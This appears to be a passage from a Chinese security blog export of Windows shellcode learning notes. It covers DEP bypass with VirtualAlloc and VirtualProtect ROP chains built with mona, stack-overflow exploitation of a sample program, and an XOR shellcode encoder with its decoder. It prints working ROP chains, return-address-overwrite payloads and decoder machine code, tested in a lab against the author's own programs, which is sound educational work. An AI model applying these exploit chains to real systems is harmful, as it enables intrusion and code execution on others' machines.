EAX,ECX // RETN [kernel32.dll] 0x6935e68f, // POP EDI // RETN [MSVCR110.dll] 0x69354486, // RETN (ROP NOP) [MSVCR110.dll] 0x693a7031, // POP EAX // RETN [MSVCR110.dll] 0x90909090, // nop 0x69390267, // PUSHAD // RETN [MSVCR110.dll] }; if(buf != NULL) { memcpy(buf, rop_gadgets, sizeof(rop_gadgets)); }; return sizeof(rop_gadgets); } // use the &#39;rop_chain&#39; variable after this call, it&#39;s just an unsigned int[] CREATE_ROP_CHAIN(rop_chain, ); // alternatively just allocate a large enough buffer and get the rop chain, i.e.: // unsigned int rop_chain[256]; // int rop_chain_length = create_rop_chain(rop_chain, ); 测试1：填入上述ROP链，接着加上测试的命令： PUSH 1; POP ECX; 对应机器码为0x9059016A 组合后的POC如下： unsigned int shellcode[]= { 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090, 0x693a2e92, // POP ECX // RETN [MSVCR110.dll] 0x693bd19c, // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll] 0x69353486, // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 0x779f9dca, // XCHG EAX,ESI // RETN [ntdll.dll] 0x69370742, // POP EBP // RETN [MSVCR110.dll] 0x75dac58d, // &amp; call esp [KERNELBASE.dll] 0x6932ea52, // POP EAX // RETN [MSVCR110.dll] 0xffffffff, // Value to negate, will become 0x00000001 0x69353746, // NEG EAX // RETN [MSVCR110.dll] 0x75da655d, // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 0x77216829, // POP EAX // RETN [kernel32.dll] 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0xa2800fc0, // put delta into eax (-&gt; put 0x00001000 into edx) 0x7721502a, // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 0x771abd3a, // XCHG EAX,EDX // RETN [kernel32.dll] 0x41414141, // Filler (RETN offset compensation) 0x69329bb1, // POP EAX // RETN [MSVCR110.dll] 0xffffffc0, // Value to negate, will become 0x00000040 0x69354484, // NEG EAX // RETN [MSVCR110.dll] 0x771d0946, // XCHG EAX,ECX // RETN [kernel32.dll] 0x6935e68f, // POP EDI // RETN [MSVCR110.dll] 0x69354486, // RETN (ROP NOP) [MSVCR110.dll] 0x693a7031, // POP EAX // RETN [MSVCR110.dll] 0x90909090, // nop 0x69390267, // PUSHAD // RETN [MSVCR110.dll] 0x9059016A, //PUSH 1 // POP ECX 0x90909090, 0x90909090, 0x90909090, 0x90909090 }; void test() { char buffer[48]; printf(&quot;3\n&quot;); memcpy(buffer,shellcode,sizeof(shellcode)); } int main() { printf(&quot;1\n&quot;); test(); char Buf[] = &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;; return 0; } 使用OllyDbg打开，单步跟踪到VirtualAllocEx()函数入口点 如图，查看传入的函数参数 申请内存区域的起始地址为0x0012FF38申请内存区域的大小为0x0000D101,换算成十进制为53505申请内存的类型为0x00001000申请内存的访问控制类型为0x00000040，即PAGE_EXECUTE_READWRITE 按F8单步跟踪，如图 返回值EAX为0,表示生成失败 查找原因，根据之前的经验，猜测是申请内存区域过长导致 测试2：尝试修改内存大小 申请内存区域的起始地址为0x0012FF38，距离当前内存页结束还有200字节(0x00130000-0x0012FF38) 猜测修改的内存长度小于等于200才能满足条件 如上图，将内存长度设置为200(0x000000C8) 按F8单步跟踪，如下图 申请成功，函数返回申请内存的起始地址 特别注意的是此处为当前内存页的起始地址：0x0012F000（而不是传入的内存起始地址0x0012FF38） 测试3：再次测试，将长度设置为201，分配内存失败 根据以上测试结果，猜测：VirtualAllocEx()函数无法跨内存页申请内存 测试4：继续测试， 将长度设置为1，函数返回当前内存页的起始地址：0x0012F000，并且shellcode成功执行 说明传入的函数长度对分配内存没有影响，但是加上申请内存的起始地址后必须小于当前内存页的长度 也就是说，在溢出过程中，通过VirtualAllocEx()函数申请的内存大小为固定值 现在，我们通过手动修改栈地址实现了DEP的绕过，下面将寻找合适的替换指令，构建自己的ROP链，解决mona自动生成产生的BUG PUSHAD表示将所有寄存器的值入栈，入栈顺序为EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI 跟踪到PUSHAD，如图 EBX存储内存的长度，需要将EBX修改为小于201的值 0x04 查找替代指令，构造ROP链 在rop.txt中寻找合适的替代指令 如上图，搜索关键词EBX,找到一条合适的替代指令： 0x771c80a2 : # XOR EAX,EAX # POP EBX # RETN ** [kernel32.dll] ** | {PAGE_EXECUTE_READ} XOR EAX,EAX 会将寄存器EAX的值清零POP EBX 会从栈顶取值并赋值给EBX 选择合适的位置，并为EBX赋值,需要注意： 该指令将寄存器EAX的值清零，所以需要找到与EAX寄存器值无关的位置 POP EBX会读取下一条指令的内容，并赋值给EBX，所以后面接上EBX的值就好，例如0x00000028, // Set EBX=0x00000028(40) 找到一个合适的位置，放在0x693a7031, // POP EAX // RETN [MSVCR110.dll] 前面 完整shellcode如下： unsigned int shellcode[]= { 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090, 0x693a2e92, // POP ECX // RETN [MSVCR110.dll] 0x693bd19c, // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll] 0x69353486, // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] 0x779f9dca, // XCHG EAX,ESI // RETN [ntdll.dll] 0x69370742, // POP EBP // RETN [MSVCR110.dll] 0x75dac58d, // &amp; call esp [KERNELBASE.dll] 0x6932ea52, // POP EAX // RETN [MSVCR110.dll] 0xffffffff, // Value to negate, will become 0x00000001 0x69353746, // NEG EAX // RETN [MSVCR110.dll] 0x75da655d, // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 0x77216829, // POP EAX // RETN [kernel32.dll] 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0xa2800fc0, // put delta into eax (-&gt; put 0x00001000 into edx) 0x7721502a, // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] 0x771abd3a, // XCHG EAX,EDX // RETN [kernel32.dll] 0x41414141, // Filler (RETN offset compensation) 0x69329bb1, // POP EAX // RETN [MSVCR110.dll] 0xffffffc0, // Value to negate, will become 0x00000040 0x69354484, // NEG EAX // RETN [MSVCR110.dll] 0x771d0946, // XCHG EAX,ECX // RETN [kernel32.dll] 0x6935e68f, // POP EDI // RETN [MSVCR110.dll] 0x69354486, // RETN (ROP NOP) [MSVCR110.dll] 0x771c80a2, // # XOR EAX,EAX # POP EBX # RETN [kernel32.dll] | {PAGE_EXECUTE_READ} 0x00000028, // Set EBX=0x00000028(40) 0x693a7031, // POP EAX // RETN [MSVCR110.dll] 0x90909090, // nop 0x69390267, // PUSHAD // RETN [MSVCR110.dll] 0x9059016A, //PUSH 1 // POP ECX 0x90909090, 0x90909090, 0x90909090, 0x90909090 }; 重新编译，使用OllyDbg打开，单步跟踪到VirtualAllocEx()函数入口点 如图，查看传入的函数参数 内存长度被修改为0x00000028(40)，其他传入参数正常 继续运行，进入CALL ESP，shellcode成功执行 0x05 小结 利用VirtualAlloc绕过DEP同利用VirtualProtect绕过DEP一样，都需要注意内存页长度的限制，无法跨页修改或者申请内存，这就对shellcode的长度提出了要求 当然，正常调用API实现VirtualProtect和VirtualAlloc不会存在跨内存页失败的问题 mona自动生成的rop链可作为参考模板，结合rop.txt下的替代指令，可构造更合适的ROP链 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Windows Shellcode学习笔记——通过VirtualProtect绕过DEP]]></title>
    <url>%2Fposts%2Fd148851d.html</url>
    <content type="text"><![CDATA[0x00 前言 在掌握了栈溢出的基本原理和利用方法后，接下来就要研究如何绕过Windows系统对栈溢出利用的重重防护，所以测试环境也从xp转到了Win7(相比xp，Win7的防护更全面)。本文将要介绍经典的DEP绕过方法——通过VirtualProtect绕过DEP 0x01 简介 本文将要介绍以下内容： VS2012的编译配置 利用Immunity Debugger的mona插件自动获取ROP链 对ROP链的分析调试 调用VirtualProtect函数时的Bug及修复 0x02 相关概念 DEP: 溢出攻击的根源在于计算机对数据和代码没有明确区分，如果将代码放置于数据段，那么系统就会去执行 为了弥补这一缺陷，微软从XP SP2开始支持数据执行保护(Data Exection Prevention) DEP保护原理: 数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，而有了DEP，此时CPU会抛出异常，而不是去执行指令 DEP四种工作状态: Optin Optout AlwaysOn AlwaysOff DEP绕过原理: 如果函数返回地址并不直接指向数据段，而是指向一个已存在的系统函数的入口地址，由于系统函数所在的页面权限是可执行的，这样就不会触发DEP 也就是说，可以在代码区找到替代指令实现shellcode的功能 但是可供利用的替代指令往往有限，无法完整的实现shellcode的功能 于是产生了一个折中方法：通过替代指令关闭DEP，再转入执行shellcode 内存页: x86系统一个内存页的大小为4kb，即0x00001000,4096 ROP: 面向返回的编程(Return-oriented Programming) VirtualProtect: BOOL VirtualProtect{ LPVOID lpAddress, DWORD dwsize, DWORD flNewProtect, PDWORD lpflOldProtect} lpAddress:内存起始地址dwsize:内存区域大小flNewProtect:内存属性，PAGE_EXECUTE_READWRITE(0x40)lpflOldProtect:内存原始属性保存地址 通过VirtualProtect绕过DEP: 在内存中查找替代指令，填入合适的参数，调用VirtualProtect将shellcode的内存属性设置为可读可写可执行，然后跳到shellcode继续执行 0x03 VS2012的编译配置 测试环境： 测试系统： Win 7 x86 编译器： VS2012 build版本： Release 项目属性： 关闭GS 关闭优化 关闭SEH 关闭DEP 关闭ASLR 禁用c++异常 禁用内部函数 具体配置方法： 配置属性-c/c++-所有属性 安全检查 否(/GS-) 启用c++异常 否 启用内部函数 否 优化 已禁用(/Od) 配置属性-链接器-所有属性 数据执行保护(DEP) 否(/NXCOMPAT:NO) 随机基址 否(/DYNAMICBASE:NO) 映像具有安全异常处理程序 否(/SAFESEH:NO) 0x04 实际测试 测试1：测试代码： char shellcode[]= &quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41\x42\x43\x44\x45&quot;; void test() { char buffer[48]; memcpy(buffer,shellcode,sizeof(shellcode)); } int main() { printf(&quot;1\n&quot;); test(); return 0; } 注： strcpy在执行时遇到0x00会提前截断,为便于测试shellcode，将strcpy换成memcpy，遇到0x00不会被截断 如上图，成功将返回地址覆盖为0x45444342 测试2：shellcode起始地址为0x00403020 PUSH 1 POP ECX 对应的机器码为0x0059016A 将返回地址覆盖为shellcode起始地址 shellcode实现如下操作： PUSH 1 POP ECX 其他位用0x90填充 c代码如下： char shellcode[]= &quot;\x6A\x01\x59\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x20\x30\x40\x00&quot;; void test() { char buffer[48]; memcpy(buffer,shellcode,sizeof(shellcode)); } int main() { printf(&quot;1\n&quot;); test(); return 0; } 如上图，shellcode成功执行，ECX寄存器赋值为1 测试3：开启DEP，再次调试，发现shellcode无法执行，如图 测试4：下载安装Immunity Debugger 下载mona插件，下载地址如下： https://github.com/corelan/mona 将mona.py放于C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands下 启动Immunity Debugger，打开test.exe 使用mona插件自动生成rop链，输入： !mona rop -m *.dll -cp nonull 如图 mona会搜寻所有的DLL，用于构造rop链 执行命令后在C:\Program Files\Immunity Inc\Immunity Debugger下生成文件rop.txt、rop_chains.txt、rop_suggestions.txt、stackpivot.txt 查看rop_chains.txt，会列出可用来关闭DEP的ROP链，选择VirtualProtect()函数 如上图，成功构建ROP链 注： 不同环境有可能无法获得完整参数，需要具体环境具体分析 对应的测试poc修改如下： unsigned int shellcode[]= { 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090,0x90909090,0x90909090,0x90909090, 0x90909090, 0x77217edd, // POP EAX // RETN [kernel32.dll] 0x77171910, // ptr to &amp;VirtualProtect() [IAT kernel32.dll] 0x75d7e9dd, // MOV EAX,DWORD PTR DS:[EAX] // RETN [KERNELBASE.dll] 0x779f9dca, // XCHG EAX,ESI // RETN [ntdll.dll] 0x779cdd30, // POP EBP // RETN [ntdll.dll] 0x75dac58d, // &amp; call esp [KERNELBASE.dll] 0x693a7031, // POP EAX // RETN [MSVCR110.dll] 0xfffffdff, // Value to negate, will become 0x00000201 0x69354484, // NEG EAX // RETN [MSVCR110.dll] 0x75da655d, // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] 0x69329bb1, // POP EAX // RETN [MSVCR110.dll] 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0x41414141, // Filler (RETN offset compensation) 0xffffffc0, // Value to negate, will become 0x00000040 0x69354484, // NEG EAX // RETN [MSVCR110.dll] 0x771abd3a, // XCHG EAX,EDX // RETN [kernel32.dll] 0x6935a7c0, // POP ECX // RETN [MSVCR110.dll] 0x693be00d, // &amp;Writable location [MSVCR110.dll] 0x779a4b9a, // POP EDI // RETN [ntdll.dll] 0x69354486, // RETN (ROP NOP) [MSVCR110.dll] 0x693417cb, // POP EAX // RETN [MSVCR110.dll] 0x90909090, // nop 0x69390267, // PUSHAD // RETN [MSVCR110.dll] 0x9059016A, //PUSH 1 // POP ECX // NOP 0x90909090, 0x90909090, 0x90909090, 0x90909090 }; void test() { char buffer[48]; printf(&quot;3\n&quot;); memcpy(buffer,shellcode,sizeof(shellcode)); } int main() { printf(&quot;1\n&quot;); test(); return 0; } 其中0x9059016A为PUSH 1;POP ECX;NOP;的机器码，如果绕过DEP，该指令将会成功执行 编译后在OllyDbg中调试 单步跟踪到CALL KERNELBA.VirtualProtectEX，查看堆栈 可获得传入的函数参数 如上图，不巧的是shellcode覆盖了SEH链 这样会导致传入VirtualProtectEX函数的参数不正确，调用失败，猜测调用VirtualProtectEX函数的返回值为0 如上图，验证上面的判断，EAX寄存器表示返回值，返回值为0，修改内存属性失败 解决思路： 我们需要扩大栈空间，将SEH链下移，确保shellcode不会覆盖到SEH链 解决方法： 修改源代码，通过申请空间的方式下移SEH链 测试5：关键代码如下： int main() { printf(&quot;1\n&quot;); test(); char Buf[] = &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;; return 0; } 编译程序，再次放在OllyDbg中调试 单步跟踪到CALL KERNELBA.VirtualProtectEX，查看堆栈 如图 SEH链成功“下移”，位于高地址，未被shellcode覆盖 此时传入VirtualProtectEX函数的参数正确 按F8单步执行，查看结果 如上图，返回值为0，修改内存属性仍失败 LastErr显示错误为ERRPR_INVALID_ADDRESS（000001E7），表示地址错误 测试6：查看正常调用函数VirtualProtect()时的堆栈，对比测试5，分析失败原因 正常调用的实现代码如下： int main() { void *p=malloc(16); printf(&quot;0x%08x\n&quot;,p); DWORD pflOldProtect; int x=VirtualProtect(p,4,0x40,&amp;pflOldProtect); printf(&quot;%d\n&quot;,x); return 0; } 测试7：如果将起始地址修改为一个不能访问的地址，如0x40303020 编译程序，放在OllyDbg中调试 单步跟踪到CALL KERNELBA.VirtualProtectEX，查看堆栈 格式如图 按F8单步执行，查看结果 如图，产生同样错误：ERRPR_INVALID_ADDRESS（000001E7） 猜测，shellcode传入的起始地址有问题 继续我们的测试 测试8接着测试5，单步跟踪到CALL KERNELBA.VirtualProtectEX，尝试修改堆栈中的数据 将内存地址0x0012FF2c修改为当前内存页的起始地址，即0x0012F000 如图 按F8单步执行，查看结果 如下图，寄存器EAX的值为1，即返回值为1，成功修改内存属性 接着向下执行，在CALL ESP的位置按下F7，单步步入 如上图，发现PUSH 1;POP ECX成功执行，测试成功，成功通过VirtualProtect绕过DEP，执行数据段的shellcode 注： 这种情况下，VirtualProtectEX一次最大只能修改4096长度的内存(即一个内存页的长度)，且不能跨页修改，如果越界，返回值为0，修改失败 通过C调用函数VirtualProtect不存在上述问题，可跨页，长度大于4096 0x05 小结 为了在Win7下搭建测试环境，对VS2012的编译配置需要特别注意，多重保护在提高程序安全性的同时也给环境搭建带来了麻烦 不同系统下可供使用的替代指令往往不同，需要不断变换思路，构造合适的ROP链 另外，Immunity Debugger的mona插件可为ROP链的编写提供便利，但要注意存在bug的情况，需要更多的测试和优化 如果shellcode长度大于4096，使用VirtualProtect关闭DEP会失败，需要选择其他方法 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Windows Shellcode学习笔记——shellcode在栈溢出中的利用与优化]]></title>
    <url>%2Fposts%2Fcafbc8f6.html</url>
    <content type="text"><![CDATA[0x00 前言 在《Windows Shellcode学习笔记——shellcode的提取与测试》中介绍了如何对shellcode作初步优化，动态获取Windows API地址并调用，并通过程序实现自动提取机器码作为shellcode并保存到文件中。 弹框实例shellcode的bin文件已上传至github，地址如下： https://github.com/3gstudent/Shellcode-Generater/blob/master/shellcode.bin 注： shellcode.bin由getshellcode.cpp生成 getshellcode.cpp地址如下： https://github.com/3gstudent/Shellcode-Generater/blob/master/getshellcode.cpp 接下来，要研究shellcode在具体环境中的使用和优化技巧 0x01 简介 先从最入门的缓冲区溢出开始 本文将要结合《0day安全：软件漏洞分析技术》中的“栈溢出原理与实践”章节，以其中的栈溢出代码作样本，优化我们自己生成的弹框实例shellcode，实现在栈溢出中的初步利用。 0x02 相关概念 栈区：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行 特殊寄存器：ESP:栈指针寄存器(extended stack pointer)，指向栈顶 EBP:基址指针寄存器(extended base pointer)，指向栈底 EIP:指令寄存器(extended instruction pointer)，指向下一条等待执行的指令地址 函数代码在栈中保存顺序(直观理解，已省略其他细节)： buffer 前栈帧EBP 返回地址 ESP 函数栈溢出原理(直观理解，已省略其他细节)： 正常情况下函数在返回过程中，最后会执行返回地址中保存的内容，通常是跳到下一条指令的地址 如果buffer长度过长，长到覆盖了返回地址的值，那么函数在返回时，就会执行被覆盖的内容 如果将shellcode保存到buffer中，覆盖的返回地址为shellcode的起始地址，那么，shellcode将得到执行，完成栈溢出的利用 0x03 栈溢出实例测试 样本代码如下： #include &lt;stdio.h&gt; #include &lt;windows.h&gt; #define PASSWORD &quot;1234567&quot; int verify_password (char *password) { int authenticated; char buffer[44]; authenticated=strcmp(password,PASSWORD); strcpy(buffer,password); return authenticated; } int main() { int valid_flag=0; char password[1024]; FILE *fp; LoadLibrary(&quot;user32.dll&quot;); if(!(fp=fopen(&quot;password.txt&quot;,&quot;rw+&quot;))) return 0; fread(password,56,1,fp); valid_flag=verify_password(password); if(valid_flag) { printf(&quot;wrong\n&quot;); } else { printf(&quot;right\n&quot;); } fclose(fp); return 0; } 注： 代码选自章节2.4.2中的实验代码，作细微调整其中fscanf(fp,”%s”,password)在遇到空格和换行符时结束，如果shellcode中包含空格(0x20)，会被截断，导致读取文件不完整 因此，将其替换为fread(password,56,1,fp); 数组password长度为56，数组buffer长度为44，在执行strcpy(buffer,password);时存在栈溢出 根据函数栈溢出原理，实现栈溢出需要以下过程： (1) 分析并调试程序，获得淹没返回地址的偏移 (2) 获得buffer的起始地址，根据获得的偏移将其覆盖返回地址，使得函数返回时执行buffer起始地址保存的代码 (3) 提取弹框操作的机器码并保存于buffer的起始地址处，在函数返回时得到执行 测试系统：Win XP 编译器：VC6.0 build版本： debug版本 (1) 分析并调试程序，获得淹没返回地址的偏移 可在password.txt中填入56个测试字符，使用OllyDbg打开程序，定位到函数返回地址 如图 返回地址刚好被覆盖 (2) 获得buffer的起始地址并覆盖返回地址 如图 获得buffer的起始地址：0012FB7C 注： 在不同系统下buffer的起始地址不同 使用0012FB7C覆盖返回地址，即password.txt的53-56位的十六进制字符为7CFB1200(逆序保存) (3) 提取弹框操作的机器码 参照《0day安全：软件漏洞分析技术》中的方法，使用Dependency Walker 获取ueser32.ll的基地址为0x77D10000MessageBoxA的偏移地址为0x000407EA 如图 因此MessageBoxA在该系统上内存中的入口地址为0x77D10000+0x000407EA=0x77D507EA 替换书中MessageBoxA对应函数入口地址的机器码 最终password.txt内容如下(十六进制视图)： 00000000h: 33 DB 53 68 77 65 73 74 68 66 61 69 6C 8B C4 53 ; 3跾hwesthfail嬆S00000010h: 50 50 53 B8 EA 07 D5 77 FF D0 90 90 90 90 90 90 ; PPS戈.誻袗悙悙?00000020h: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 ; 悙悙悙悙悙悙悙悙00000030h: 90 90 90 90 7C FB 12 00 ; 悙悙|?. 最终程序运行如图，栈溢出在我们的测试系统上触发成功 0x03 弹框实例shellcode在栈溢出的优化 上节简单介绍了一下栈溢出实例的原理和操作方法，本节将要介绍如何优化我们自己开发的shellcode，即弹框实例shellcode，结合具体漏洞，实现利用 弹框实例shellcode下载地址： https://github.com/3gstudent/Shellcode-Generater/blob/master/shellcode.bin shellcode长度1536 (1) 修改实例程序，使其数组足以保存我们的shellcode 完整代码如下： #include &lt;stdio.h&gt; #include &lt;windows.h&gt; #define PASSWORD &quot;1234567&quot; int verify_password (char *password) { int authenticated; char buffer[1556]; authenticated=strcmp(password,PASSWORD); strcpy(buffer,password); return authenticated; } int main() { int valid_flag=0; char password[2048]={0}; FILE *fp; if(!(fp=fopen(&quot;password2.txt&quot;,&quot;rb&quot;))) return 0; fread(password,1568,1,fp); valid_flag=verify_password(password); if(valid_flag) { printf(&quot;wrong\n&quot;); } else { printf(&quot;right\n&quot;); } fclose(fp); return 0; } buffer长度增大到1556，用于保存弹框实例shellcode 根据上节实例，淹没返回地址的偏移9-12，因此password的长度增加到1556+12=1568 (2) strcpy遇到字符00会截断 如图 弹框实例shellcode在00000009h处字符为0x00，strcpy在执行时遇到0x00会提前截断，导致shellcode不完整，无法覆盖返回地址 所以，需要对shellcode进行编码 为方便读者理解，参照《0day安全：软件漏洞分析技术》中3.5.2节的方法(此章节有详细说明，不再赘述过程)： shellcode尾部添加结束字符0x90 将shellcode逐字节同0x44作异或加密 汇编实现解码器并提取机器码 解码器的机器码放于shellcode首部 解码器将EAX对准shellcode起始位置，逐字节同0x44异或进行解密，遇到0x90停止 解码器的汇编代码如下： void main() { __asm { add eax,0x14 xor ecx,ecx decode_loop: mov bl,[eax+ecx] xor bl,0x44 mov [eax+ecx],bl inc ecx cmp bl,0x90 jne decode_loop } } 使用OllyDbg提取出机器码如下： &quot;\x83\xC0\x14\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x90\x75\xF1&quot; 新的shellcode格式如下： 解码器机器码+加密的弹框实例shellcode+0xD4+&quot;\x90\x90\x90\x90\x90\x90\x90&quot;+&quot;\x7C\xFB\x12\x00&quot; 注： 0x90^0x44=0xD4,0xD4即编码后的结束字符 “\x90\x90\x90\x90\x90\x90\x90”为填充字符串，无意义 “\x7C\xFB\x12\x00”为覆盖的函数返回地址 (3) 0xD4冲突 如图 弹框实例shellcode中也包含结束字符0xD4，解密时shellcode会被提前截断，所以需要选择一个新的结束字符 当然也可以对shellcode分段加密，针对此shellcode，恰巧0xD5未出现，因此使用0xD5作结束字符串即可，解密字符为0x91 修改后的机器码如下： &quot;\x83\xC0\x14\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1&quot; 修改后的shellcode格式如下： 解码器机器码+加密的弹框实例shellcode+0xD5+&quot;\x90\x90\x90\x90\x90\x90\x90&quot;+&quot;\x7C\xFB\x12\x00&quot; (4) shellcode编码测试 编写程序实现自动读取原shellcode，加密，添加解密机器码，添加结束字符 程序已上传至github https://github.com/3gstudent/Shellcode-Generater/blob/master/enshellcode.cpp 执行后如图，产生新的shellcode文件，并在屏幕输出c格式的shellcode 使用如下代码，结合屏幕输出c格式的shellcode，替换数组内容，对新的加密shellcode测试 由于代码较长，所以上传至github，地址如下： https://github.com/3gstudent/Shellcode-Generater/blob/master/testenshellcode.cpp 如图，shellcode执行，成功实现解码器 (5) 新shellcode在栈溢出中的测试 填上解码器机器码，完整的shellcode格式如下： &quot;\x83\xC0\x14\x33\xC9\x8A\x1C\x08\x80\xF3\x44\x88\x1C\x08\x41\x80\xFB\x91\x75\xF1&quot;+加密的弹框实例shellcode+0xD5+&quot;\x90\x90\x90\x90\x90\x90\x90&quot;+&quot;\x7C\xFB\x12\x00&quot; 在栈溢出测试程序中仍然报错，使用OllyDbg加载继续调试 如下图，成功覆盖函数返回地址，接着按F8进行单步调试 如下图，此时发现异常，EAX寄存器的值为909090D5，正常情况下EAX的值应该为Buffer的起始地址，这样才能成功找到shellcode并对其解密 而寄存器EDX却保存了Buffer的起始地址 所以，我们需要对解码器作修改 (6) 修改解码器 选择一个最简单直接的方法，将EDX对准shellcode的起始位置，实现的汇编代码如下： void main() { __asm { add edx,0x14 xor ecx,ecx decode_loop: mov bl,[edx+ecx] xor bl,0x44 mov [edx+ecx],bl inc ecx cmp bl,0x90 jne decode_loop } } 在OllyDbg中加载程序并提取机器码，如图 新的解码器机器码为： &quot;\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1&quot; 最终的shellcode代码为： &quot;\x83\xC2\x14\x33\xC9\x8A\x1C\x0A\x80\xF3\x44\x88\x1C\x0A\x41\x80\xFB\x91\x75\xF1&quot;+加密的弹框实例shellcode+0xD5+&quot;\x90\x90\x90\x90\x90\x90\x90&quot;+&quot;\x7C\xFB\x12\x00&quot; 完整shellcode代码已上传至github，地址为： https://github.com/3gstudent/Shellcode-Generater/blob/master/stackoverflowshellcode.bin 再次测试栈溢出，如图，shellcode成功执行 由于shellcode是我们自己实现的动态获取API地址，所以栈溢出测试程序中的LoadLibrary(“user32.dll”); 可以省略 0x04 小结 本文对栈溢出原理作了简要描述，着重介绍了在具体的栈溢出环境下，shellcode的优化、调试和利用技巧 当然，上述shellcode存在一个不足：shellcode在内存中的起始地址往往不固定，导致漏洞利用不一定成功 下一篇文章将要解决这个问题 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Windows Shellcode学习笔记——shellcode的提取与测试]]></title>
    <url>%2Fposts%2F2c419042.html</url>
    <content type="text"><![CDATA[0x00 前言 之前在《Windows Shellcode学习笔记——通过VisualStudio生成shellcode》介绍了使用C++编写（不使用内联汇编），实现动态获取API地址并调用，对其反汇编提取shellcode的方法，并开源了测试代码。 接下来在对shellcode进行提取的过程中，发现了当时开源代码的一些bug，所以本文着重解决测试代码的bug，并介绍使用C++开发shellcode需要考虑的一些问题。 存在bug的测试代码下载地址： https://github.com/3gstudent/Shellcode-Generater/blob/master/shellcode.cpp 0x01 简介 简单的shellcode提取流程： 使用c++开发代码 更改VisualStudio编译配置 生成exe 在IDA下打开生成的exe，获得机器码 由于是动态获取API地址并调用，所以为了保证shellcode的兼容性，代码中不能出现固定地址，并且要尽量避免使用全局变量，如果代码中包含子函数，根据调用方式，还有注意各个函数之间的排列顺序（起始函数放于最前） 0x02 Bug修复 配置三个编译选项:release、禁用优化、禁用/GS 将代码编译，然后使用IDA提取机器码作为shellcode 在实际调试过程中，发现代码存在bug： 1、代码中应合理处理全局变量在代码中使用全局变量 FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR); HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR); 在编译后会成为一个固定地址，导致shellcode无法兼容不同环境 最简单直接的方式是在shellcode中尽量避免全局变量 2、函数声明方式需要修改修改全局变量后，以下代码需要修改： MESSAGEBOXA_INITIALIZE 